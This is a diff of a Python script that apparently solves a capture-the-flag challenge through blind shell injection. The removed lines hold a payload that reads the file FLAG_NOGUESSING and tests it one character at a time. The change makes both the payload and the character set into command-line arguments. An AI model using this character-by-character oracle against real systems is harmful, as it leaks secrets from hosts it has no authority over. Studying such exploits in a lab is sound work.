@@ -3,11 +3,8 @@ import time
 import socket
 import sys
 
-# thing = """out="$(echo *)"; [ "%s" == "${out:%d:1}" ] && exit"""
-# chrs = [''] + ['%c' % c for c in range(0x20, 0x80)]
-
-thing = """read out < FLAG_NOGUESSING; [ "%s" == "${out:%d:1}" ] && exit"""
-chrs = [''] + list("0123456789abcdef")
+chrs = [''] + list(sys.argv[1])
+thing = sys.argv[2] + """; [ "%s" == "${out:%d:1}" ] && exit"""
 
 bytes = []
 for i in itertools.count():
